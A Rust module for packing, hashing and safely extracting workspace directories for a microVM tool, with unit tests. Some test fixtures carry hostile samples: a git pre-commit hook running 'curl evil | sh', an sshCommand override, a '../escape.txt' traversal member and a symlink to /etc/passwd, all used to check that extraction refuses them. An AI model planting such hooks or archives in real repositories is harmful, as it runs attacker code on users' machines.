// SPDX-License-Identifier: Apache-2.0
//! The local half of directory transfer: the walk, the hash, the tar packing and the guarded
//! extraction behind `microvms_app::workspace::LocalTree` (#260).
//!
//! The rules (the skip list, the budgets, what a manifest and a diff are, which members an
//! extraction may write) are the app's `workspace` module; this is the filesystem and `tar`
//! doing what they say.
//!
//! # Packing is deterministic, budgeted, and skips what can't or shouldn't travel
//!
//! Members are added in sorted path order, so the same tree produces the same bytes. The
//! budgets are enforced during the walk, on file sizes, before a byte of archive is
//! allocated, so an over-budget tree is an error naming the offending path rather than an OOM
//! kill. Sockets, fifos and devices are skipped: `tar` refuses to archive them, the daemon
//! refuses to extract them, and a live `puma.sock` under `tmp/` must not refuse the whole
//! project. Symlinks are preserved as links (`follow_symlinks(false)`): following them would
//! inline files from outside the tree, a silent size multiplier and an exfiltration shape.

use std::path::Path;

use microvms_app::workspace::{
    Artifact, LocalTree, MANIFEST_VERSION, MAX_PACK_BYTES, MAX_PACK_MEMBERS, Manifest, Packed,
    SKIPPED_DIRS, WorkspaceError, within_byte_budget, within_member_budget,
};

/// The real filesystem as a [`LocalTree`].
#[derive(Clone, Copy, Debug, Default)]
pub struct DiskTree;

impl LocalTree for DiskTree {
    fn manifest(&self, dir: &Path) -> Result<Manifest, WorkspaceError> {
        manifest(dir)
    }

    fn pack(&self, dir: &Path) -> Result<Packed, WorkspaceError> {
        pack(dir)
    }

    fn pack_paths(&self, dir: &Path, paths: &[String]) -> Result<Packed, WorkspaceError> {
        pack_paths(dir, paths)
    }

    fn extract(
        &self,
        archive: &[u8],
        globs: &[String],
        dir: &Path,
    ) -> Result<Vec<Artifact>, WorkspaceError> {
        extract(archive, globs, dir)
    }
}

/// Whether `glob` is a pattern [`LocalTree::extract`] can match with, and why not when it
/// isn't: the one glob grammar, for a caller that validates globs before a run needs them.
pub fn check_glob(glob: &str) -> Result<(), WorkspaceError> {
    compile(glob).map(drop)
}

/// One glob, compiled, or the refusal every caller reports.
fn compile(glob: &str) -> Result<globset::Glob, WorkspaceError> {
    globset::Glob::new(glob).map_err(|error| {
        WorkspaceError::new(format!("artifacts glob {glob:?} does not compile: {error}"))
    })
}

/// Packs `dir` into a tar archive: sorted member order, the skip list applied, budgets
/// enforced during the walk, symlinks preserved as links rather than followed.
fn pack(dir: &Path) -> Result<Packed, WorkspaceError> {
    let mut walk = Walk::default();
    collect(dir, &mut walk)?;
    walk.paths.sort();

    let mut builder = tar::Builder::new(Vec::new());
    builder.follow_symlinks(false);
    let mut members = 0usize;
    for path in &walk.paths {
        let relative = path.strip_prefix(dir).expect("collected under dir");
        builder
            .append_path_with_name(path, relative)
            .map_err(|error| WorkspaceError::new(format!("packing {}: {error}", path.display())))?;
        members += 1;
    }
    let archive = builder
        .into_inner()
        .map_err(|error| WorkspaceError::new(format!("finishing the archive: {error}")))?;
    Ok(Packed { archive, members })
}

/// The walk's accumulator: the paths to pack, and the running budgets.
#[derive(Default)]
struct Walk {
    paths: Vec<std::path::PathBuf>,
    bytes: u64,
}

/// Walks `dir`, collecting every packable entry. Directories are collected too: an
/// empty directory a build script expects should exist on the other side. Skipped whole:
/// the [`SKIPPED_DIRS`] names. Skipped individually: sockets, fifos, devices, since `tar`
/// refuses to archive them and the daemon refuses to extract them, so a live socket
/// under `tmp/` must not refuse the whole project. Budgets are checked as the walk runs,
/// so an over-budget tree is refused before any archive bytes exist.
fn collect(dir: &Path, walk: &mut Walk) -> Result<(), WorkspaceError> {
    let entries = std::fs::read_dir(dir)
        .map_err(|error| WorkspaceError::new(format!("reading {}: {error}", dir.display())))?;
    for entry in entries {
        let entry = entry
            .map_err(|error| WorkspaceError::new(format!("reading {}: {error}", dir.display())))?;
        let path = entry.path();
        if SKIPPED_DIRS
            .iter()
            .any(|skipped| entry.file_name() == *skipped)
        {
            continue;
        }
        // `symlink_metadata`, not `metadata`: a symlink to a directory is a link member,
        // not a tree to descend into, and descending would follow the link out of the tree.
        let kind = path
            .symlink_metadata()
            .map_err(|error| WorkspaceError::new(format!("reading {}: {error}", path.display())))?;
        let file_type = kind.file_type();
        if !file_type.is_file() && !file_type.is_dir() && !file_type.is_symlink() {
            continue;
        }
        if file_type.is_file() {
            walk.bytes = walk.bytes.saturating_add(kind.len());
            if !within_byte_budget(walk.bytes) {
                return Err(WorkspaceError::new(format!(
                    "the tree exceeds the {} MiB upload budget at {}: the daemon refuses \
                     larger bodies. Move build output aside, or run against a smaller \
                     directory ({:?} are already skipped)",
                    MAX_PACK_BYTES / (1024 * 1024),
                    path.display(),
                    SKIPPED_DIRS,
                )));
            }
        }
        walk.paths.push(path.clone());
        if !within_member_budget(walk.paths.len()) {
            return Err(WorkspaceError::new(format!(
                "the tree exceeds the {MAX_PACK_MEMBERS}-member upload budget at {}: the \
                 daemon refuses larger archives ({:?} are already skipped)",
                path.display(),
                SKIPPED_DIRS,
            )));
        }
        if file_type.is_dir() {
            collect(&path, walk)?;
        }
    }
    Ok(())
}

/// A path relative to the synced root, `/`-separated regardless of platform.
fn relative_key(path: &Path, root: &Path) -> String {
    path.strip_prefix(root)
        .expect("collected under the root")
        .components()
        .map(|component| component.as_os_str().to_string_lossy())
        .collect::<Vec<_>>()
        .join("/")
}

/// Hashes and classifies the tree under `dir` into a [`Manifest`].
///
/// The walk is [`collect`], with the same skip list, the same budgets, the same symlink
/// stance as [`pack`], so the manifest describes exactly the set a pack would upload.
/// A second walk elsewhere would be a second set of rules to keep in step.
///
/// Files are hashed streaming rather than read whole: the byte budget admits trees up
/// to 512 MiB, and a `Vec` of the largest admissible file per hash would be an
/// allocation the archive path never needs.
fn manifest(dir: &Path) -> Result<Manifest, WorkspaceError> {
    use sha2::{Digest as _, Sha256};

    let mut walk = Walk::default();
    collect(dir, &mut walk)?;

    let mut built = Manifest {
        version: MANIFEST_VERSION,
        ..Manifest::default()
    };
    for path in &walk.paths {
        let key = relative_key(path, dir);
        let kind = path
            .symlink_metadata()
            .map_err(|error| WorkspaceError::new(format!("reading {}: {error}", path.display())))?;
        let file_type = kind.file_type();
        if file_type.is_symlink() {
            let target = std::fs::read_link(path).map_err(|error| {
                WorkspaceError::new(format!("reading link {}: {error}", path.display()))
            })?;
            built
                .symlinks
                .insert(key, target.to_string_lossy().into_owned());
        } else if file_type.is_dir() {
            built.dirs.insert(key);
        } else {
            use std::io::Read as _;
            let mut file = std::fs::File::open(path).map_err(|error| {
                WorkspaceError::new(format!("reading {}: {error}", path.display()))
            })?;
            let mut hasher = Sha256::new();
            let mut buffer = [0u8; 64 * 1024];
            loop {
                let read = file.read(&mut buffer).map_err(|error| {
                    WorkspaceError::new(format!("hashing {}: {error}", path.display()))
                })?;
                if read == 0 {
                    break;
                }
                hasher.update(&buffer[..read]);
            }
            built
                .files
                .insert(key, const_hex::encode(hasher.finalize()));
        }
    }
    Ok(built)
}

/// Packs exactly the named relative paths under `dir`, in sorted member order.
///
/// The selective sibling of [`pack`]: same builder settings, same determinism, but the
/// member set is the caller's diff rather than a walk, which is the whole incremental
/// bet, an archive proportional to the edit rather than to the tree.
fn pack_paths(dir: &Path, paths: &[String]) -> Result<Packed, WorkspaceError> {
    let mut sorted: Vec<&String> = paths.iter().collect();
    sorted.sort();
    let mut builder = tar::Builder::new(Vec::new());
    builder.follow_symlinks(false);
    let mut members = 0usize;
    for relative in sorted {
        let path = dir.join(relative);
        builder
            .append_path_with_name(&path, relative)
            .map_err(|error| WorkspaceError::new(format!("packing {}: {error}", path.display())))?;
        members += 1;
    }
    let archive = builder
        .into_inner()
        .map_err(|error| WorkspaceError::new(format!("finishing the archive: {error}")))?;
    Ok(Packed { archive, members })
}

/// Unpacks the glob-selected regular-file members of `archive` into `dir`.
///
/// Everything else (unmatched members, symlinks, hardlinks, specials, directories) is
/// skipped, not refused: the archive is the VM's word and the globs are the caller's, so
/// the only members with any business landing locally are the intersection, as plain
/// files. `unpack_in` anchors the write under `dir` and refuses traversal, which covers
/// the archive that names `../escape`.
///
/// `.git` members are refused even when a glob matches them, and this is the extraction
/// side's own security line rather than symmetry for its own sake: `artifacts = ["**"]`
/// is the natural spelling for "bring everything back", and a workload that writes
/// `.git/hooks/pre-commit` (mode bits land verbatim) or sets `core.sshCommand` in
/// `.git/config` would execute on the *host*, as the caller, on their next `git` command.
/// Traversal refusal does not cover this: these are in-tree paths.
fn extract(archive: &[u8], globs: &[String], dir: &Path) -> Result<Vec<Artifact>, WorkspaceError> {
    let mut set = globset::GlobSetBuilder::new();
    for glob in globs {
        set.add(compile(glob)?);
    }
    let set = set
        .build()
        .map_err(|error| WorkspaceError::new(error.to_string()))?;

    let mut out = Vec::new();
    let mut entries = tar::Archive::new(archive);
    let entries = entries
        .entries()
        .map_err(|error| WorkspaceError::new(format!("reading the returned archive: {error}")))?;
    for entry in entries {
        let mut entry = entry.map_err(|error| {
            WorkspaceError::new(format!("reading the returned archive: {error}"))
        })?;
        if entry.header().entry_type() != tar::EntryType::Regular {
            continue;
        }
        let path = entry
            .path()
            .map_err(|error| WorkspaceError::new(format!("a member's path: {error}")))?
            .into_owned();
        // The host's repository is never a write target. See the doc comment: a hook or
        // a config key written here runs on the host, outside the sandbox.
        if path
            .components()
            .any(|component| component.as_os_str() == ".git")
        {
            continue;
        }
        if !set.is_match(&path) {
            continue;
        }
        let bytes = entry.size();
        let written = entry
            .unpack_in(dir)
            .map_err(|error| WorkspaceError::new(format!("writing {}: {error}", path.display())))?;
        // `unpack_in` answers false for a member it refused (traversal); a refused member
        // is skipped like an unmatched one rather than failing the run that produced it.
        if written {
            out.push(Artifact {
                path: path.display().to_string(),
                bytes,
            });
        }
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use microvms_app::workspace::diff;

    /// A tree under a temp dir, removed on drop.
    struct TempTree(std::path::PathBuf, #[allow(dead_code)] tempfile::TempDir);

    impl TempTree {
        fn new(label: &str) -> Self {
            let dir = tempfile::Builder::new()
                .prefix(&format!("microvm-workspace-{label}-"))
                .tempdir()
                .expect("a temp dir");
            Self(dir.path().to_path_buf(), dir)
        }
    }

    fn member_names(archive: &[u8]) -> Vec<String> {
        tar::Archive::new(archive)
            .entries()
            .expect("parses")
            .map(|entry| {
                entry
                    .expect("a member")
                    .path()
                    .expect("a path")
                    .display()
                    .to_string()
            })
            .collect()
    }

    /// Every skip-list directory stays home; the working tree travels.
    #[test]
    fn packing_skips_the_skip_list_whole() {
        let tree = TempTree::new("skip-list");
        for skipped in SKIPPED_DIRS {
            std::fs::create_dir_all(tree.0.join(skipped)).expect("dir");
            std::fs::write(tree.0.join(skipped).join("payload"), b"stays home").expect("file");
        }
        std::fs::write(tree.0.join("kept.rs"), b"fn main() {}").expect("source");

        let packed = pack(&tree.0).expect("packs");
        let names = member_names(&packed.archive);
        assert_eq!(names, ["kept.rs"], "{names:?}");
    }

    /// A socket in the tree is skipped rather than refusing the whole project.
    #[cfg(unix)]
    #[test]
    fn packing_skips_a_live_socket_instead_of_refusing_the_tree() {
        let tree = TempTree::new("socket");
        std::fs::write(tree.0.join("app.rb"), b"puts :hi").expect("source");
        let _listener = std::os::unix::net::UnixListener::bind(tree.0.join("puma.sock"))
            .expect("a live socket");

        let packed = pack(&tree.0).expect("a socket must not refuse the project");
        assert_eq!(member_names(&packed.archive), ["app.rb"]);
    }

    /// A tree over the member budget is refused during the walk, naming the subtree,
    /// before any archive bytes are allocated.
    #[test]
    fn packing_refuses_an_over_budget_tree_by_name() {
        let tree = TempTree::new("member-budget");
        // Not 100k real files: the budget is a constant, so the test asserts the check
        // through the byte budget instead, with one file whose *reported* size exceeds
        // it: a sparse file costs nothing on disk.
        let big = tree.0.join("huge.bin");
        let file = std::fs::File::create(&big).expect("creates");
        file.set_len(MAX_PACK_BYTES + 1).expect("sparse grow");
        drop(file);

        let error = pack(&tree.0).expect_err("over budget");
        assert!(error.to_string().contains("huge.bin"), "{error}");
        assert!(error.to_string().contains("MiB"), "{error}");
    }

    /// `.git` members never land locally, even when the glob matches them.
    ///
    /// The security line: `artifacts = ["**"]` is the natural "bring everything back",
    /// and a workload-written `.git/hooks/pre-commit` would run on the *host* at the
    /// caller's next commit.
    ///
    /// **Falsification**: drop the `.git`-component check from `extract` and
    /// the no-`.git`-write assertion goes red with the hook on disk. Done on 2026-08-28;
    /// failed as stated; restored.
    #[test]
    fn extraction_never_writes_under_the_local_git() {
        let tree = TempTree::new("git-refusal");
        let archive = archive_of(&[
            (".git/hooks/pre-commit", b"#!/bin/sh\ncurl evil | sh\n"),
            (".git/config", b"[core]\n\tsshCommand = /tmp/pwn\n"),
            ("dist/report.txt", b"fine"),
        ]);
        let got = extract(&archive, &["**".into()], &tree.0).expect("extracts");
        assert_eq!(got.len(), 1, "only the non-git member lands");
        assert_eq!(got[0].path, "dist/report.txt");
        assert!(!tree.0.join(".git").exists(), "no .git write, ever");
    }

    /// `.git` never reaches the archive; the working tree does.
    #[test]
    fn packing_skips_git_and_keeps_the_working_tree() {
        let tree = TempTree::new("skip-git");
        std::fs::create_dir_all(tree.0.join(".git/objects")).expect("git dir");
        std::fs::write(tree.0.join(".git/objects/blob"), b"loose object").expect("blob");
        std::fs::create_dir_all(tree.0.join("src")).expect("src");
        std::fs::write(tree.0.join("src/main.rs"), b"fn main() {}").expect("source");

        let packed = pack(&tree.0).expect("packs");
        let names = member_names(&packed.archive);
        assert!(names.iter().any(|name| name == "src/main.rs"), "{names:?}");
        assert!(!names.iter().any(|name| name.contains(".git")), "{names:?}");
    }

    /// A symlink member survives as a link and its target is not inlined.
    #[cfg(unix)]
    #[test]
    fn packing_preserves_a_symlink_without_following_it() {
        let tree = TempTree::new("symlink");
        std::fs::write(tree.0.join("real.txt"), b"data").expect("file");
        std::os::unix::fs::symlink("real.txt", tree.0.join("link.txt")).expect("link");

        let packed = pack(&tree.0).expect("packs");
        let mut archive = tar::Archive::new(packed.archive.as_slice());
        let mut kinds = std::collections::BTreeMap::new();
        for entry in archive.entries().expect("parses") {
            let entry = entry.expect("a member");
            kinds.insert(
                entry.path().expect("a path").display().to_string(),
                entry.header().entry_type(),
            );
        }
        assert_eq!(kinds["link.txt"], tar::EntryType::Symlink, "{kinds:?}");
    }

    /// The same tree packs to the same bytes: member order is sorted, not readdir order.
    #[test]
    fn packing_is_deterministic() {
        let tree = TempTree::new("deterministic");
        for name in ["b.txt", "a.txt", "c.txt"] {
            std::fs::write(tree.0.join(name), name.as_bytes()).expect("writes");
        }
        let first = pack(&tree.0).expect("packs");
        let second = pack(&tree.0).expect("packs");
        assert_eq!(first.archive, second.archive);
        assert_eq!(
            member_names(&first.archive),
            ["a.txt", "b.txt", "c.txt"],
            "sorted, not readdir order"
        );
    }

    fn archive_of(members: &[(&str, &[u8])]) -> Vec<u8> {
        let mut builder = tar::Builder::new(Vec::new());
        for (name, body) in members {
            let mut header = tar::Header::new_gnu();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder
                .append_data(&mut header, name, *body)
                .expect("appends");
        }
        builder.into_inner().expect("finishes")
    }

    /// Only glob-matched members land; the rest of the VM's word stays in the VM.
    #[test]
    fn extraction_writes_matched_members_and_skips_the_rest() {
        let tree = TempTree::new("select");
        let archive = archive_of(&[
            ("dist/report.txt", b"selected"),
            ("secrets.env", b"never asked for"),
        ]);
        let got = extract(&archive, &["dist/**".into()], &tree.0).expect("extracts");
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].path, "dist/report.txt");
        assert!(tree.0.join("dist/report.txt").exists());
        assert!(!tree.0.join("secrets.env").exists());
    }

    /// A member that traverses out of the destination is skipped, not written.
    ///
    /// The fixture writes the `..` name into the header's own bytes, because
    /// `Builder::append_data` refuses to *create* such a member, and an attacker does not
    /// use the builder. This is the archive as a hostile daemon would actually send it.
    #[test]
    fn extraction_refuses_traversal_out_of_the_destination() {
        let tree = TempTree::new("traversal");
        let inner = tree.0.join("inner");
        std::fs::create_dir_all(&inner).expect("inner");

        let body = b"out";
        let mut header = tar::Header::new_gnu();
        {
            let name = b"../escape.txt";
            let gnu = header.as_gnu_mut().expect("a gnu header");
            gnu.name[..name.len()].copy_from_slice(name);
        }
        header.set_size(body.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        let mut archive = Vec::new();
        archive.extend_from_slice(header.as_bytes());
        archive.extend_from_slice(body);
        archive.resize(archive.len().div_ceil(512) * 512, 0);
        archive.extend_from_slice(&[0u8; 1024]);

        let got = extract(&archive, &["**".into()], &inner).expect("extracts nothing");
        assert!(got.is_empty(), "{:?}", got.len());
        assert!(!tree.0.join("escape.txt").exists());
    }

    /// The manifest names every member kind with a stable identity, and the same tree
    /// manifests identically twice.
    #[test]
    fn a_manifest_is_deterministic_and_covers_every_member_kind() {
        let tree = TempTree::new("manifest");
        std::fs::create_dir_all(tree.0.join("src")).expect("dir");
        std::fs::create_dir_all(tree.0.join("empty")).expect("empty dir");
        std::fs::write(tree.0.join("src/main.rs"), b"fn main() {}").expect("file");
        #[cfg(unix)]
        std::os::unix::fs::symlink("src/main.rs", tree.0.join("link.rs")).expect("link");

        let first = manifest(&tree.0).expect("manifests");
        let second = manifest(&tree.0).expect("manifests");
        assert_eq!(first, second, "same tree, same manifest");
        assert_eq!(first.version, MANIFEST_VERSION);
        // sha256("fn main() {}"), computed independently with sha256sum.
        assert_eq!(
            first.files["src/main.rs"],
            "ef32637cb9c3ec2e3968c9cbdf26a5e9c172be94f88af533e14bd43f892d5297"
        );
        assert!(first.dirs.contains("empty"), "{:?}", first.dirs);
        #[cfg(unix)]
        assert_eq!(first.symlinks["link.rs"], "src/main.rs");
    }

    /// The manifest walks with the pack's own skip list: what never uploads never
    /// appears, so a skipped directory cannot show up as a deletion either.
    #[test]
    fn a_manifest_skips_what_packing_skips() {
        let tree = TempTree::new("manifest-skip");
        std::fs::create_dir_all(tree.0.join(".git")).expect("git");
        std::fs::write(tree.0.join(".git/HEAD"), b"ref: main").expect("head");
        std::fs::write(tree.0.join("kept.rs"), b"fn main() {}").expect("source");

        let built = manifest(&tree.0).expect("manifests");
        assert_eq!(built.files.len(), 1, "{:?}", built.files);
        assert!(built.files.contains_key("kept.rs"));
        assert!(built.dirs.is_empty(), "{:?}", built.dirs);
    }

    /// An unchanged tree diffs to an empty delta, the fact that makes the second sync
    /// of an unchanged tree transfer ~0 bytes (issue #71's acceptance line).
    #[test]
    fn an_unchanged_tree_diffs_to_nothing() {
        let tree = TempTree::new("diff-unchanged");
        std::fs::write(tree.0.join("a.txt"), b"a").expect("file");
        let local = manifest(&tree.0).expect("manifests");
        let remote = manifest(&tree.0).expect("manifests");
        let delta = diff(&local, &remote);
        assert!(delta.is_empty(), "{delta:?}");
    }

    /// `DiskTree` is these functions behind the port: each method answers what its function
    /// does, so a caller holding a `&dyn LocalTree` gets the real walk and extraction.
    #[test]
    fn the_disk_tree_is_the_walk_the_pack_and_the_extraction() {
        let tree = TempTree::new("disk-tree");
        std::fs::create_dir_all(tree.0.join("src")).expect("dir");
        std::fs::write(tree.0.join("src/main.rs"), b"fn main() {}").expect("file");
        let port: &dyn LocalTree = &DiskTree;

        assert_eq!(
            port.manifest(&tree.0).expect("manifests"),
            manifest(&tree.0).expect("manifests")
        );
        assert_eq!(
            member_names(&port.pack(&tree.0).expect("packs").archive),
            ["src", "src/main.rs"]
        );
        assert_eq!(
            member_names(
                &port
                    .pack_paths(&tree.0, &["src/main.rs".into()])
                    .expect("packs")
                    .archive
            ),
            ["src/main.rs"]
        );
        let out = TempTree::new("disk-tree-out");
        let archive = archive_of(&[("dist/app.txt", b"real")]);
        let written = port
            .extract(&archive, &["**".into()], &out.0)
            .expect("extracts");
        assert_eq!(
            written,
            [Artifact {
                path: "dist/app.txt".into(),
                bytes: 4
            }]
        );
    }

    /// A glob the extraction can't compile is refused by name, and one it can passes.
    #[test]
    fn a_glob_is_checked_with_the_extractions_grammar() {
        assert_eq!(check_glob("dist/**"), Ok(()));
        let refused = check_glob("dist/[").expect_err("an unclosed class");
        assert!(
            refused.to_string().contains("\"dist/[\" does not compile"),
            "{refused}"
        );
    }

    /// A selective pack carries exactly the named members: the archive is proportional
    /// to the edit, not to the tree.
    #[test]
    fn packing_selected_paths_carries_them_and_nothing_else() {
        let tree = TempTree::new("pack-paths");
        std::fs::create_dir_all(tree.0.join("src")).expect("dir");
        std::fs::write(tree.0.join("src/changed.rs"), b"edited").expect("file");
        std::fs::write(tree.0.join("src/unchanged.rs"), b"same").expect("file");

        let packed =
            pack_paths(&tree.0, &["src/changed.rs".to_string()]).expect("packs the selection");
        assert_eq!(packed.members, 1);
        assert_eq!(member_names(&packed.archive), ["src/changed.rs"]);
    }

    /// A symlink member is never extracted, even when a glob matches it.
    #[test]
    fn extraction_skips_non_regular_members() {
        let tree = TempTree::new("nonregular");
        let mut builder = tar::Builder::new(Vec::new());
        let mut header = tar::Header::new_gnu();
        header.set_entry_type(tar::EntryType::Symlink);
        header.set_size(0);
        header.set_cksum();
        builder
            .append_link(&mut header, "dist/link", "/etc/passwd")
            .expect("appends");
        let archive = builder.into_inner().expect("finishes");

        let got = extract(&archive, &["dist/**".into()], &tree.0).expect("extracts");
        assert!(got.is_empty());
        assert!(!tree.0.join("dist/link").exists());
    }
}
